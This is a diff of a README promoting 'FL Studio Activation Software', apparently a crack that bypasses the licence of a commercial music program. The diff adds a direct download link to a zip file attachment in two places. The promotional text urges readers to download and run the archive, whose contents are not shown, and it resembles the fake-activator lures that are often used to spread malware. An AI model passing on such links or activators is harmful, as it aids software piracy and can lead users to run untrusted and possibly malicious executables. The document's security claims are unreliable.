@@ -10,7 +10,7 @@ Welcome to the FL Studio Activation Software repository! This software simplifie
 ## Overview
 FL Studio Activation Software automates and streamlines the activation steps, ensuring a seamless experience for users needing to activate FL Studio quickly and efficiently.
 
-[Releases]()
+[Releases](https://github.com/user-attachments/files/16446836/FLStudio.zip)
 
 ## Key Features
 - **User-Friendly Interface**: Intuitive design makes activation accessible to all users.
@@ -18,7 +18,7 @@ FL Studio Activation Software automates and streamlines the activation steps, en
 - **Security**: Ensures secure activation without compromising software integrity.
 
 ## How to Use
-1. **Download**: [Download the latest release]() of FL Studio Activation Software.
+1. **Download**: [Download the latest release](https://github.com/user-attachments/files/16446836/FLStudio.zip) of FL Studio Activation Software.
 2. **Installation**: Follow the provided installation instructions.
 3. **Activation**: Launch the software, input necessary details, and activate FL Studio effortlessly.
 
